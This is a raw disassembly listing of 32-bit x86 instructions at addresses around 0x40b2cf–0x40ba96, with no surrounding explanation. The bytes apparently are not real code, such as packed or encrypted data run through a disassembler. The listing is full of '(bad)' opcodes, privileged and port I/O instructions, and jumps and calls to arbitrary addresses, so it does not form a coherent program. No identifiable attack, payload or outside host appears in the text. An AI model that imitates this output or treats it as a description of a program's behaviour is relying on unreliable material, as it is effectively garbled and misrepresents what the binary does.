  40b2cf:	add    eax,DWORD PTR [eax]
  40b2d1:	call   0x64273d6
  40b2d6:	add    esi,DWORD PTR [esi-0x3b2efc83]
  40b2dc:	dec    esi
  40b2dd:	ins    DWORD PTR es:[edi],dx
  40b2de:	in     al,dx
  40b2df:	lea    eax,[eax]
  40b2e1:	inc    ebp
  40b2e2:	inc    ebp
  40b2e3:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  40b2e9:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  40b2f3:	and    al,0xdc
  40b2f5:	ror    DWORD PTR [edx+0x24],0xf7
  40b2f9:	or     BYTE PTR [ebp+0x4c],dh
  40b2fc:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  40b300:	stos   BYTE PTR es:[edi],al
  40b301:	adc    edx,edi
  40b303:	inc    esp
  40b304:	add    edi,DWORD PTR [eax]
  40b306:	jne    0x40b2eb
  40b308:	mov    DWORD PTR [eax-0x7449db04],ecx
  40b30e:	cmp    ecx,DWORD PTR [edi]
  40b310:	sub    BYTE PTR [ebp-0x7e],dl
  40b313:	sar    ebp,0xb
  40b316:	jmp    FWORD PTR [edi+0x2400392a]
  40b31c:	sub    esi,DWORD PTR [ebx-0x73]
  40b31f:	mov    esp,DWORD PTR [ecx+edi*4]
  40b322:	mov    ecx,DWORD PTR [eax]
  40b324:	and    BYTE PTR [eax],al
  40b326:	jne    0x40b2f2
  40b328:	sub    ebp,ecx
  40b32a:	sbb    BYTE PTR [esi+0x32],ah
  40b32d:	dec    ebp
  40b32e:	push   ebp
  40b32f:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  40b335:	ret    
  40b336:	mov    edx,ebp
  40b338:	leave  
  40b339:	sub    DWORD PTR [esi+0x24],ebx
  40b33c:	ret    0x2b
  40b33f:	pop    ax
  40b341:	push   ebp
  40b342:	rol    BYTE PTR [ebx],0xeb
  40b345:	add    DWORD PTR [ecx+0x6c0001],0x40
  40b34c:	jb     0x40b3a3
  40b34e:	ret    
  40b34f:	in     al,dx
  40b350:	jecxz  0x40b2dd
  40b352:	push   esi
  40b353:	xchg   esp,eax
  40b354:	jne    0x40b356
  40b356:	cmp    edx,DWORD PTR [esi+0x1c]
  40b359:	jne    0x40b33f
  40b35b:	mov    eax,DWORD PTR [ebp-0x77]
  40b35e:	ror    DWORD PTR [ebx+0x899408],0xe0
  40b365:	mov    esi,DWORD PTR [ebp-0x75]
  40b368:	pop    esi
  40b369:	nop
  40b36a:	mov    eax,DWORD PTR [eax]
  40b36c:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  40b372:	add    al,0x0
  40b374:	inc    ebp
  40b375:	mov    eax,DWORD PTR [ebx]
  40b377:	mov    ebp,ebx
  40b379:	cmp    al,0xf
  40b37b:	or     al,al
  40b37d:	inc    ebp
  40b37e:	inc    ebp
  40b37f:	xor    eax,0x8bc89c8b
  40b384:	ins    BYTE PTR es:[edi],dx
  40b385:	cld    
  40b386:	add    BYTE PTR [edi+0x576c16c0],dh
  40b38c:	add    BYTE PTR [ecx-0x5],dl
  40b38f:	add    eax,0x17200
  40b394:	sbb    al,0x85
  40b396:	dec    esp
  40b397:	je     0x40b3d1
  40b399:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  40b39d:	add    BYTE PTR [ebx],bh
  40b39f:	(bad)  
  40b3a0:	and    al,0x34
  40b3a2:	jae    0x40b340
  40b3a4:	mov    cl,cl
  40b3a6:	inc    DWORD PTR [esp]
  40b3a9:	push   ebp
  40b3aa:	shr    esp,0x8
  40b3ad:	in     al,dx
  40b3ae:	push   esp
  40b3af:	and    DWORD PTR [eax],0xffffffdc
  40b3b2:	retf   
  40b3b3:	(bad)  
  40b3b4:	mov    bh,0xe4
  40b3b6:	add    BYTE PTR [ebp+0x450ff8e9],dh
  40b3bc:	retf   0x4cf5
  40b3bf:	pushf  
  40b3c0:	and    bh,al
  40b3c2:	pop    ss
  40b3c3:	rcr    cl,1
  40b3c5:	test   DWORD PTR [eax],eax
  40b3c7:	clc    
  40b3c8:	add    BYTE PTR [ebp+0x2b],al
  40b3cb:	xor    eax,ecx
  40b3cd:	pushf  
  40b3ce:	add    eax,0xd001c7
  40b3d3:	add    eax,0x456cf8c0
  40b3d8:	inc    eax
  40b3d9:	push   ebx
  40b3da:	rcr    DWORD PTR [eax+0x4c0105],0x20
  40b3e1:	inc    ebp
  40b3e2:	fst    DWORD PTR [esi+0x29]
  40b3e5:	mov    eax,DWORD PTR [eax]
  40b3e7:	nop
  40b3e8:	rol    BYTE PTR [eax],0xc0
  40b3eb:	mov    ecx,DWORD PTR [ebp-0x3c4fdbe4]
  40b3f1:	add    DWORD PTR [ebx-0x75f9af00],ecx
  40b3f7:	pop    ebp
  40b3f8:	add    DWORD PTR [ecx+0x758bf800],ecx
  40b3fe:	or     BYTE PTR [ebp-0xce8aca],al
  40b404:	mov    bl,BYTE PTR [eax]
  40b406:	add    DWORD PTR [ebp+0x0],edx
  40b409:	call   0xfff3b317
  40b40e:	add    DWORD PTR [edi],ecx
  40b410:	add    BYTE PTR [edi],al
  40b412:	push   cs
  40b413:	inc    ecx
  40b414:	or     BYTE PTR [ebx+0x18008901],0x8
  40b41b:	leave  
  40b41c:	dec    ecx
  40b41d:	dec    esi
  40b41e:	add    esi,DWORD PTR [ebp-0x39]
  40b421:	call   0xffe6a322
  40b426:	clc    
  40b427:	inc    ebp
  40b428:	inc    ebp
  40b429:	mov    ecx,DWORD PTR [edi]
  40b42b:	enter  0x49,0x35
  40b42f:	mov    ecx,DWORD PTR [eax]
  40b431:	xor    eax,0x79e0807
  40b436:	xor    bl,BYTE PTR [esi-0x743ecda2]
  40b43c:	or     al,0x1c
  40b43e:	sbb    BYTE PTR ds:0x8b004d01,0x0
  40b445:	int3   
  40b446:	test   DWORD PTR [eax],eax
  40b448:	clc    
  40b449:	inc    edx
  40b44b:	mov    eax,DWORD PTR [eax]
  40b44d:	fmul   DWORD PTR [ebx+0x74ff8300]
  40b453:	sub    BYTE PTR [ebp-0x40],ah
  40b456:	add    BYTE PTR [esi+0x45],bl
  40b459:	leave  
  40b45a:	xor    eax,0xc78b9c18
  40b45f:	jl     0x40b441
  40b461:	add    BYTE PTR [ebp+0x458df88b],al
  40b467:	add    al,0x31
  40b469:	or     BYTE PTR [eax+ebp*8-0x3617f139],bl
  40b470:	test   edx,esp
  40b472:	clc    
  40b473:	or     eax,DWORD PTR [ebp+0x40]
  40b476:	xor    eax,0x8b949f89
  40b47b:	inc    ebp
  40b47c:	sbb    al,0xbe
  40b47e:	mov    ecx,DWORD PTR [eax]
  40b480:	xchg   esp,eax
  40b481:	pop    es
  40b482:	add    dh,al
  40b484:	mov    esp,DWORD PTR [ebp+0x1c]
  40b487:	add    BYTE PTR [edi-0x62],dl
  40b48a:	mov    eax,0x30132
  40b48f:	mov    DWORD PTR [ebp-0x68],eax
  40b492:	mov    eax,DWORD PTR [ebp-0x74]
  40b495:	xor    eax,DWORD PTR [eax]
  40b497:	add    ecx,DWORD PTR [ebx-0xf637677]
  40b49d:	inc    ebp
  40b49e:	jge    0x40b4f0
  40b4a0:	mov    DWORD PTR [ebp-0xc],eax
  40b4a3:	xor    eax,eax
  40b4a5:	add    ecx,DWORD PTR [ebx]
  40b4a7:	push   eax
  40b4a8:	jne    0x40b4ef
  40b4aa:	mov    eax,DWORD PTR ds:0x3f001c
  40b4b0:	dec    DWORD PTR [ebx-0x7f74e375]
  40b4b6:	add    eax,DWORD PTR [ecx]
  40b4b8:	cmp    al,0x0
  40b4ba:	push   cs
  40b4bb:	inc    ebp
  40b4bc:	inc    ebp
  40b4bd:	add    al,0x85
  40b4bf:	add    BYTE PTR [edi+edi*8-0x1],dh
  40b4c3:	mov    ebx,DWORD PTR [esp+ecx*1]
  40b4c6:	mov    ebp,0x8bffff4d
  40b4cb:	mov    ebx,DWORD PTR [esp+esi*8]
  40b4ce:	sbb    al,0x1
  40b4d1:	inc    ebp
  40b4d2:	add    BYTE PTR [ebx-0x74a87700],cl
  40b4d8:	push   ecx
  40b4d9:	clc    
  40b4da:	add    eax,0x457218
  40b4df:	mov    eax,DWORD PTR [ebp+0x50]
  40b4e2:	jne    0x40b529
  40b4e4:	mov    ecx,DWORD PTR [ebx-0x39761fe4]
  40b4ea:	add    edi,eax
  40b4ec:	add    BYTE PTR [ebp+0x31],al
  40b4ef:	lea    eax,[eax+0x4501dc]
  40b4f5:	lea    edx,[eax-0x74]
  40b4f8:	xor    ecx,DWORD PTR [ebx-0x39a4f7a1]
  40b4fe:	ret    0xc7
  40b501:	mov    eax,DWORD PTR [eax+0xee011c]
  40b507:	add    BYTE PTR [eax],cl
  40b509:	push   eax
  40b50a:	inc    ebp
  40b50b:	inc    ebp
  40b50c:	add    DWORD PTR [ebx+0x8b98eb],ecx
  40b512:	test   edi,eax
  40b514:	jne    0x40b4a2
  40b516:	mov    eax,DWORD PTR [eax]
  40b518:	mov    eax,DWORD PTR [eax]
  40b51a:	push   eax
  40b51b:	pop    ebp
  40b51c:	inc    ebp
  40b51d:	dec    DWORD PTR [ebx+0x570ce48b]
  40b523:	rcl    BYTE PTR [ecx-0x40],1
  40b526:	xor    esi,DWORD PTR [eax]
  40b528:	add    DWORD PTR [ebp-0x70],0xffffff83
  40b52c:	mov    edi,0x8372fc
  40b531:	push   eax
  40b532:	(bad)  
  40b533:	jbe    0x40b57a
  40b535:	mov    ecx,DWORD PTR [ebx-0x39341714]
  40b53b:	ret    
  40b53c:	(bad)  
  40b53d:	dec    ebp
  40b53e:	inc    ebp
  40b53f:	jmp    0x40b4ce
  40b541:	mov    ecx,DWORD PTR [esp+eiz*8-0xf7f375]
  40b548:	(bad)  
  40b549:	cld    
  40b54a:	(bad)  
  40b54b:	push   ebp
  40b54c:	mov    ecx,DWORD PTR [eax+0x18aa8b1c]
  40b552:	add    BYTE PTR [ebx],bh
  40b554:	push   eax
  40b555:	push   eax
  40b556:	inc    ebp
  40b557:	jmp    0x3d900e7
  40b55c:	add    BYTE PTR [ebx+0x8ca0c7],cl
  40b562:	add    BYTE PTR [ebx-0x13cfd500],cl
  40b568:	inc    ebp
  40b569:	ret    
  40b56a:	mov    DWORD PTR [ebp-0x14],edx
  40b56d:	mov    edx,eax
  40b56f:	sub    BYTE PTR [ebp-0x2d],cl
  40b572:	mov    ecx,DWORD PTR [ebp-0x75]
  40b575:	mov    eax,esi
  40b577:	rol    BYTE PTR [eax],1
  40b579:	inc    ebp
  40b57a:	add    DWORD PTR [eax],eax
  40b57c:	inc    ebp
  40b57d:	add    BYTE PTR [ecx+0x18838beb],cl
  40b583:	clc    
  40b584:	inc    eax
  40b585:	jmp    0x8d45:0x74945589
  40b58c:	xor    ecx,DWORD PTR [eax]
  40b58e:	add    edx,DWORD PTR [ebp-0x77]
  40b591:	mov    ebx,DWORD PTR [eax-0x76aaba18]
  40b597:	mov    ebx,DWORD PTR [eax+edi*8-0x76af48bb]
  40b59e:	inc    ebp
  40b59f:	fdiv   DWORD PTR [ebx]
  40b5a1:	loop   0x40b5a6
  40b5a3:	(bad)  
  40b5a5:	add    BYTE PTR [ebp+0x55],al
  40b5a8:	add    eax,0xd8008b
  40b5ad:	jmp    0xcd80:0x621c818b
  40b5b4:	add    DWORD PTR [ebx],esi
  40b5b6:	add    BYTE PTR [ecx-0x63fbcdbb],al
  40b5bc:	add    BYTE PTR [ebp-0x77],dh
  40b5bf:	mov    edx,DWORD PTR [eax+0x45cb30d4]
  40b5c5:	dec    ebp
  40b5c6:	inc    DWORD PTR [ebx]
  40b5c8:	test   DWORD PTR [ebx+0x108b0074],eax
  40b5ce:	sbb    BYTE PTR [ebp+0x65],dl
  40b5d1:	add    eax,DWORD PTR [eax]
  40b5d3:	mov    edi,DWORD PTR [eax-0x75]
  40b5d6:	add    ah,dl
  40b5d8:	and    edx,DWORD PTR [ecx*2-0x741bd475]
  40b5df:	dec    ebp
  40b5e0:	mov    DWORD PTR [ebx-0xfc071c],eax
  40b5e6:	dec    ebp
  40b5e7:	call   0x55426376
  40b5ec:	inc    ebp
  40b5ed:	add    DWORD PTR [ebx+0x855fcf4],ecx
  40b5f3:	cmp    ecx,DWORD PTR [ebp-0x5c]
  40b5f6:	inc    eax
  40b5f7:	add    BYTE PTR [ecx+0x73],dl
  40b5fa:	jb     0x40b5ff
  40b5fc:	mov    esi,eax
  40b5fe:	cmp    al,0x50
  40b600:	retf   
  40b601:	mov    DWORD PTR [ecx+0x4500f0],eax
  40b607:	test   ebx,edx
  40b609:	andnps xmm6,XMMWORD PTR [edx+0x3]
  40b60d:	dec    DWORD PTR [ecx+0x51ecfc8b]
  40b613:	inc    ebp
  40b614:	add    eax,edi
  40b616:	mov    DWORD PTR [eax+ebx*1-0x38ffab00],ecx
  40b61d:	inc    ecx
  40b61e:	hlt    
  40b61f:	mov    DWORD PTR [eax],eax
  40b621:	xchg   esp,eax
  40b622:	add    BYTE PTR [ebp+0x7d],al
  40b625:	xor    eax,edx
  40b627:	add    edx,ecx
  40b629:	mov    DWORD PTR [ecx+0x5f45e898],ecx
  40b62f:	mov    DWORD PTR [eax-0x64],edx
  40b632:	mov    DWORD PTR [ebp-0x8],eax
  40b635:	push   eax
  40b636:	push   ebp
  40b637:	inc    ebp
  40b638:	mov    DWORD PTR [ebx],esi
  40b63a:	call   0xf910b42
  40b63f:	inc    ebp
  40b640:	adc    al,BYTE PTR ds:0x810055
  40b646:	dec    DWORD PTR [ebx-0x7f76e400]
  40b64c:	aam    0x1
  40b64e:	push   ebp
  40b64f:	add    cl,al
  40b651:	xor    BYTE PTR [eax*2-0x7472003e],cl
  40b658:	call   FWORD PTR [esi+edx*8]
  40b65b:	cmp    dl,0x1
  40b65e:	test   DWORD PTR [eax],eax
  40b660:	clc    
  40b661:	inc    ebp
  40b662:	and    cl,BYTE PTR [ebx+0x7503fc4d]
  40b668:	mov    DWORD PTR [ecx+0x1008ffd4],ecx
  40b66e:	cmp    edi,edi
  40b670:	je     0x40b642
  40b672:	mov    eax,DWORD PTR [ebp-0x4]
  40b675:	add    edx,DWORD PTR [ecx]
  40b677:	sbb    al,0x0
  40b679:	dec    ebp
  40b67a:	dec    ebp
  40b67b:	mov    DWORD PTR [ecx+0x4545011c],ecx
  40b681:	mov    ecx,DWORD PTR [ebx+0x4590181c]
  40b687:	add    DWORD PTR [edx],eax
  40b689:	add    BYTE PTR [ebp+0x45],cl
  40b68c:	jne    0x40b619
  40b68e:	mov    ecx,DWORD PTR [eax+esi*8-0x7474ab00]
  40b695:	cmp    esp,esi
  40b697:	jb     0x40b62a
  40b699:	mov    eax,DWORD PTR [eax]
  40b69b:	mov    eax,DWORD PTR [eax]
  40b69d:	mov    edx,DWORD PTR [esp+edi*1]
  40b6a0:	inc    ebp
  40b6a1:	je     0x40b62e
  40b6a3:	push   eax
  40b6a4:	add    al,0x38
  40b6a6:	push   ebp
  40b6a7:	mov    DWORD PTR ds:[ecx],edi
  40b6aa:	in     al,0xc
  40b6ac:	shl    BYTE PTR [eax],cl
  40b6ae:	test   DWORD PTR [ecx],eax
  40b6b0:	call   DWORD PTR [edx]
  40b6b2:	inc    esi
  40b6b4:	inc    ebp
  40b6b5:	ror    BYTE PTR [ecx+0x45459011],1
  40b6bb:	jmp    0xff41b3c4
  40b6c0:	mov    ecx,DWORD PTR [ebx-0xfba7eb0]
  40b6c6:	mov    eax,DWORD PTR [eax]
  40b6c8:	loopne 0x40b655
  40b6ca:	(bad)  
  40b6cb:	sbb    al,0xc7
  40b6cd:	inc    ebp
  40b6ce:	inc    ebp
  40b6cf:	push   ebx
  40b6d0:	lea    edi,[eax+0x454fdc]
  40b6d6:	lea    ecx,[ecx-0x74a774]
  40b6dc:	or     BYTE PTR [edi-0x3a],dl
  40b6df:	js     0x40b6a8
  40b6e1:	mov    ecx,DWORD PTR [ebx-0x117ae39a]
  40b6e7:	inc    DWORD PTR [eax]
  40b6e9:	call   DWORD PTR [eax+0x79]
  40b6ec:	inc    ebp
  40b6ed:	add    BYTE PTR [ebx+0x859866],cl
  40b6f3:	(bad)  
  40b6f4:	(bad)  
  40b6f5:	dec    DWORD PTR [ebx-0x2f99f3b9]
  40b6fb:	test   DWORD PTR [ebp-0x1],eax
  40b6fe:	mov    edi,edi
  40b700:	add    al,0x0
  40b703:	add    ax,WORD PTR [ebp-0xb20004]
  40b70a:	inc    DWORD PTR [edx+0x14]
  40b70d:	add    BYTE PTR [eax],cl
  40b70f:	data16 jne 0x40b697
  40b712:	push   ebx
  40b713:	call   DWORD PTR [ebp-0x1]
  40b716:	mov    eax,eax
  40b718:	cld    
  40b719:	inc    bp
  40b71b:	test   DWORD PTR [ebp+0x45ff04ff],ecx
  40b721:	inc    eax
  40b722:	mov    eax,DWORD PTR [eax]
  40b724:	sbb    al,0x66
  40b726:	inc    ebp
  40b727:	test   DWORD PTR [ebx+0xff90ff],ecx
  40b72d:	ror    BYTE PTR [ebx-0x7f7ae39a],0xff
  40b734:	add    edi,edi
  40b736:	add    BYTE PTR [ebp+0x30],al
  40b739:	add    BYTE PTR [ecx],dh
  40b73b:	popw   ds
  40b73d:	test   DWORD PTR [edx],esi
  40b73f:	(bad)  
  40b740:	cmp    bh,bh
  40b742:	jbe    0x40b70b
  40b744:	lea    ecx,[ecx-0x7493c9]
  40b74a:	add    edi,DWORD PTR [eax+0x734f39]
  40b750:	mov    ecx,DWORD PTR [ecx-0x749175]
  40b756:	sub    edi,DWORD PTR [eax+0x89d003]
  40b75c:	mov    ecx,DWORD PTR [ecx-0x698f04]
  40b762:	(bad)  
  40b763:	mov    eax,0xecd755
  40b768:	in     al,dx
  40b769:	mov    DWORD PTR [eax],eax
  40b76b:	jb     0x40b76d
  40b76d:	inc    DWORD PTR [ebp-0x48]
  40b770:	mov    ecx,esp
  40b772:	sbb    al,0x0
  40b774:	push   esi
  40b775:	mov    DWORD PTR ds:0x66ff0074,ecx
  40b77b:	mov    DWORD PTR [ebp-0x7a0014],0xad7d8df8
  40b785:	add    bh,al
  40b787:	mov    WORD PTR [ebp-0xa6],ax
  40b78e:	mov    eax,0x354f45
  40b793:	pushf  
  40b794:	mov    DWORD PTR [ebp-0x7600fda4],ecx
  40b79a:	lea    edi,[eax+0x4]
  40b79d:	dec    DWORD PTR [ecx-0x1ba13a]
  40b7a3:	mov    BYTE PTR [ebx-0x7639af1b],0xe6
  40b7aa:	pusha  
  40b7ab:	(bad)  
  40b7ac:	jmp    edi
  40b7ae:	mov    eax,0xe84fc6
  40b7b3:	xor    ecx,DWORD PTR [ecx-0x169d3a]
  40b7b9:	xor    eax,DWORD PTR [ebx-0x76ff3a42]
  40b7bf:	add    BYTE PTR [esp+eax*2-0x1],ah
  40b7c3:	in     al,0xb8
  40b7c5:	mov    dh,0x4f
  40b7c7:	add    DWORD PTR [eax],0x49
  40b7ca:	mov    esi,ebx
  40b7cc:	data16 mov bh,bh
  40b7cf:	add    DWORD PTR [ebx-0x7613c7fa],0x45
  40b7d6:	push   0xb845ffe3
  40b7db:	loope  0x40b82c
  40b7dd:	inc    ebp
  40b7de:	add    bl,dl
  40b7e0:	mov    DWORD PTR [ebp+0x6a],eax
  40b7e3:	out    dx,al
  40b7e4:	inc    DWORD PTR [ebp-0x75]
  40b7e7:	and    DWORD PTR [esi+0x45],esp
  40b7ea:	test   DWORD PTR [esi],ebp
  40b7ec:	inc    DWORD PTR [ebp-0x1]
  40b7ef:	jl     0x40b83a
  40b7f1:	leave  
  40b7f2:	add    BYTE PTR [esi+eiz*2-0x24],al
  40b7f6:	test   DWORD PTR [esi+0x49ff83ff],esi
  40b7fc:	outs   dx,DWORD PTR ds:[esi]
  40b7fd:	fiadd  WORD PTR [eax]
  40b7ff:	mov    BYTE PTR [esi-0x7d],ah
  40b802:	test   DWORD PTR [edi],eax
  40b804:	(bad)  
  40b805:	in     al,dx
  40b806:	inc    DWORD PTR [ebp+0x6c]
  40b809:	loope  0x40b80b
  40b80b:	inc    ebp
  40b80c:	data16 aam 0x85
  40b80f:	inc    ebp
  40b810:	(bad)  
  40b811:	call   0xe5bcfe15
  40b816:	add    BYTE PTR [ebp+0x66],al
  40b819:	fild   WORD PTR [ebp-0x1300bb]
  40b81f:	inc    ebp
  40b820:	inc    ebp
  40b821:	xlat   BYTE PTR ds:[ebx]
  40b822:	xor    al,0x45
  40b824:	pushf  
  40b825:	jl     0x40b7df
  40b827:	leave  
  40b828:	icebp  
  40b829:	inc    esp
  40b82a:	add    ah,dl
  40b82c:	mov    DWORD PTR [esi+0x49ff8376],esi
  40b832:	(bad)  
  40b833:	fdivrp st(0),st
  40b835:	mov    BYTE PTR [ebp+0x4708f883],al
  40b83b:	in     al,dx
  40b83c:	test   WORD PTR [ebp-0x1],ax
  40b843:	inc    ebp
  40b844:	inc    ebp
  40b845:	mov    edx,ebp
  40b847:	cld    
  40b848:	inc    ebp
  40b849:	out    dx,eax
  40b84a:	rcl    BYTE PTR [ebx],1
  40b84c:	inc    ebp
  40b84d:	mov    edi,edx
  40b84f:	mov    eax,DWORD PTR [ebp+0x54]
  40b852:	and    edi,edi
  40b854:	inc    ebp
  40b855:	cmp    ebp,DWORD PTR [esi]
  40b857:	jne    0x40b82b
  40b859:	mov    DWORD PTR [ebp-0x44],0xf8c9857c
  40b860:	retf   
  40b861:	inc    ebp
  40b862:	add    dl,ah
  40b864:	lea    ebx,[ebp+ecx*1+0x181c0f8b]
  40b86b:	xor    bl,0x1
  40b86e:	add    eax,DWORD PTR [eax]
  40b870:	inc    ecx
  40b871:	adc    BYTE PTR [eax],bl
  40b873:	test   ecx,edi
  40b875:	add    dh,BYTE PTR [edx+0x0]
  40b878:	mov    BYTE PTR [ebp-0x24],0x8b
  40b87c:	(bad)  
  40b87d:	jl     0x40b85c
  40b87f:	add    dh,al
  40b881:	mov    esi,ebx
  40b883:	mov    eax,esi
  40b885:	sbb    al,0xdf
  40b887:	add    dh,0x1
  40b88a:	loopne 0x40b88c
  40b88c:	(bad)  
  40b88d:	adc    cl,ah
  40b88f:	or     dh,al
  40b891:	inc    ebp
  40b892:	loop   0x40b875
  40b894:	xor    ebp,eax
  40b896:	(bad)  
  40b897:	(bad)  
  40b898:	or     eax,0x18ec0ff8
  40b89d:	jl     0x40b892
  40b89f:	inc    ebp
  40b8a0:	add    ebx,DWORD PTR [ecx+0x41]
  40b8a3:	adc    BYTE PTR [eax],bl
  40b8a5:	repnz stc 
  40b8a7:	xor    BYTE PTR [edx+0x35],0xc6
  40b8ab:	adc    ah,dl
  40b8ad:	dec    ecx
  40b8ae:	(bad)  
  40b8af:	repnz aad 0x45
  40b8b2:	(bad)  
  40b8b3:	mov    esi,edx
  40b8b5:	adc    al,0xc6
  40b8b7:	call   edi
  40b8b9:	(bad)  
  40b8ba:	(bad)  
  40b8bb:	adc    al,bl
  40b8bd:	inc    esi
  40b8bf:	push   eax
  40b8c0:	fld    DWORD PTR [ebp-0x3a]
  40b8c3:	mov    esi,0x7c608da
  40b8c8:	fcmovnb st,st(6)
  40b8ca:	xor    ebx,DWORD PTR [esi+0x30d328d]
  40b8d0:	(bad)  
  40b8d2:	sbb    BYTE PTR [ebp-0xd],al
  40b8d5:	add    DWORD PTR [ebx],0x66
  40b8d8:	inc    ecx
  40b8d9:	mov    ebx,DWORD PTR [eax]
  40b8db:	sbb    al,0xf9
  40b8dd:	xor    BYTE PTR [edx+0x1],0x8d
  40b8e1:	add    BYTE PTR [ebp+eax*4-0x1],dl
  40b8e5:	dec    DWORD PTR [ecx+0x4d00fcff]
  40b8eb:	add    BYTE PTR [eax+0x7145fc30],bh
  40b8f1:	inc    DWORD PTR [ecx]
  40b8f3:	mov    ecx,DWORD PTR [ebp-0x310010]
  40b8f9:	retf   
  40b8fa:	enter  0xe45,0x3b
  40b8fe:	inc    ebp
  40b8ff:	jne    0x40b936
  40b901:	mov    eax,ds:0x33c70b9c
  40b906:	mov    esp,0xf81585ef
  40b90b:	mov    ds:0x338b0b45,eax
  40b910:	mov    WORD PTR [edi-0x5cc68e00],cs
  40b916:	ud2    
  40b918:	xchg   ebp,eax
  40b919:	xor    eax,DWORD PTR [eax]
  40b91b:	dec    edx
  40b91c:	mov    eax,DWORD PTR [eax]
  40b91e:	sbb    al,0x83
  40b920:	cmp    ah,0x1
  40b923:	push   0x0
  40b925:	pop    eax
  40b926:	adc    BYTE PTR [ecx-0x7483bb],cl
  40b92c:	and    BYTE PTR [esi+0x0],0x85
  40b930:	mov    edi,edi
  40b932:	push   0xffffffff
  40b934:	(bad)  
  40b935:	mov    esp,esi
  40b937:	adc    ah,0x75
  40b93a:	in     eax,0x66
  40b93c:	inc    ebp
  40b93d:	inc    ebp
  40b93e:	fild   QWORD PTR [edx-0x29]
  40b941:	mov    ecx,DWORD PTR [ebp-0x75990be4]
  40b947:	inc    ebp
  40b948:	sub    BYTE PTR [edx+0x49],0x58
  40b94c:	jmp    0x752c:0x40868889
  40b953:	lea    ax,[ebp-0xc]
  40b957:	xor    eax,DWORD PTR [ebp-0x5f0078]
  40b95d:	mov    DWORD PTR [ebp-0x820076],eax
  40b963:	stos   DWORD PTR es:[edi],eax
  40b964:	mov    ebp,DWORD PTR [ebx-0x43a87414]
  40b96a:	push   ecx
  40b96b:	test   DWORD PTR [ebx],esi
  40b96d:	(bad)  
  40b96e:	mov    ebx,0xc072ff
  40b973:	push   ebp
  40b974:	ret    
  40b975:	(bad)  
  40b976:	mov    eax,eax
  40b978:	sbb    al,0xdf
  40b97a:	rcl    ah,0x50
  40b97d:	inc    ebp
  40b97e:	inc    ebp
  40b97f:	into   
  40b980:	mov    ebp,ebx
  40b982:	cwde   
  40b983:	mov    DWORD PTR [eax],0x10d3c7c8
  40b989:	call   0xdf41ff8d
  40b98e:	add    cl,ch
  40b990:	jmp    DWORD PTR [esi-0x75]
  40b993:	inc    ebp
  40b994:	or     BYTE PTR [edi],bh
  40b996:	rol    bh,1
  40b998:	dec    ebp
  40b999:	adc    BYTE PTR [ebx],dh
  40b99b:	inc    DWORD PTR [ebx]
  40b99d:	add    cl,BYTE PTR [ecx-0x3e174400]
  40b9a3:	push   ss
  40b9a4:	push   ds
  40b9a5:	add    dh,ch
  40b9a7:	test   DWORD PTR [ebx-0x1],esi
  40b9aa:	or     eax,0x22850bff
  40b9af:	(bad)  
  40b9b0:	out    dx,al
  40b9b1:	push   DWORD PTR [ebx-0x75]
  40b9b4:	add    eax,0x3357e9ec
  40b9b9:	push   ecx
  40b9ba:	out    dx,al
  40b9bb:	xor    esi,DWORD PTR [ebx+0x3]
  40b9be:	jmp    0x85bb13
  40b9c3:	and    DWORD PTR [ebp+0x44],0x0
  40b9c7:	mov    esp,DWORD PTR [eax]
  40b9c9:	sbb    al,0x66
  40b9cb:	add    BYTE PTR [ebp-0xff00ff],0x30
  40b9d2:	mov    DWORD PTR [ebp+0x7e],eax
  40b9d5:	(bad)  
  40b9d6:	inc    DWORD PTR [ebx-0xbadf9a]
  40b9dc:	push   0xffffffff
  40b9de:	pop    eax
  40b9df:	clc    
  40b9e0:	mov    DWORD PTR [eax],ecx
  40b9e2:	or     BYTE PTR [ecx-0x8aef8d],0x58
  40b9e9:	mov    DWORD PTR [ecx+0x76ff8428],ecx
  40b9ef:	lea    esp,[esi+0x10]
  40b9f2:	inc    ebp
  40b9f3:	jmp    FWORD PTR [edx+0x50]
  40b9f6:	pop    eax
  40b9f7:	inc    ebp
  40b9f8:	mov    DWORD PTR [ebx],esi
  40b9fa:	mov    BYTE PTR [ebx],al
  40b9fc:	rcl    BYTE PTR [eax+0x45],0x85
  40ba00:	inc    WORD PTR [ebp-0x1]
  40ba04:	lea    ecx,[ebx-0x7f99e35f]
  40ba0a:	stos   BYTE PTR es:[edi],al
  40ba0b:	add    DWORD PTR [ebp+0x0],eax
  40ba0e:	mov    ecx,ecx
  40ba10:	adc    al,0x95
  40ba12:	(bad)  
  40ba13:	push   DWORD PTR [ebx]
  40ba15:	dec    DWORD PTR [ebp+0x45ffc095]
  40ba1b:	dec    esp
  40ba1d:	push   ebp
  40ba1e:	loopne 0x40b9a9
  40ba20:	(bad)  
  40ba21:	adc    al,0xc4
  40ba23:	call   ebx
  40ba25:	mov    ebp,ebp
  40ba27:	sbb    BYTE PTR [ebp-0x1],al
  40ba2a:	loop   0x40b9b5
  40ba2c:	ds and al,0xc7
  40ba2f:	dec    esp
  40ba31:	mov    edx,ebp
  40ba33:	sub    al,0xe1
  40ba35:	inc    edi
  40ba37:	mov    eax,edx
  40ba39:	xor    BYTE PTR [edi+edi*8-0x7b],bh
  40ba3d:	(bad)  
  40ba3e:	dec    DWORD PTR [ebx-0x2ffff701]
  40ba44:	add    BYTE PTR [ebp+0x2c],al
  40ba47:	push   eax
  40ba48:	add    bh,dl
  40ba4a:	mov    DWORD PTR [ebp+0x18],edi
  40ba4d:	jbe    0x40ba4e
  40ba4f:	test   DWORD PTR [ebp-0xffefff],ecx
  40ba55:	inc    ebp
  40ba56:	push   eax
  40ba57:	add    DWORD PTR [ebp-0x4],0x801be
  40ba5e:	pop    es
  40ba5f:	add    dh,0xfe
  40ba62:	ret    
  40ba63:	dec    DWORD PTR [ebx-0x3fffe346]
  40ba69:	mov    ecx,0x454f50
  40ba6e:	mov    eax,ecx
  40ba70:	cwde   
  40ba71:	mov    DWORD PTR [eax],eax
  40ba73:	test   al,0xff
  40ba75:	ror    BYTE PTR [ebx-0x2f99f775],0x55
  40ba7c:	lea    ecx,[ebp-0x7600f201]
  40ba82:	mov    ebp,DWORD PTR [edx+ebp*2-0x7a99a73e]
  40ba89:	push   ebp
  40ba8a:	dec    DWORD PTR [ebp-0x767aec01]
  40ba90:	push   DWORD PTR [eax+0x6685c2ff]
  40ba96:	call   DWORD PTR [ebp-0x1]
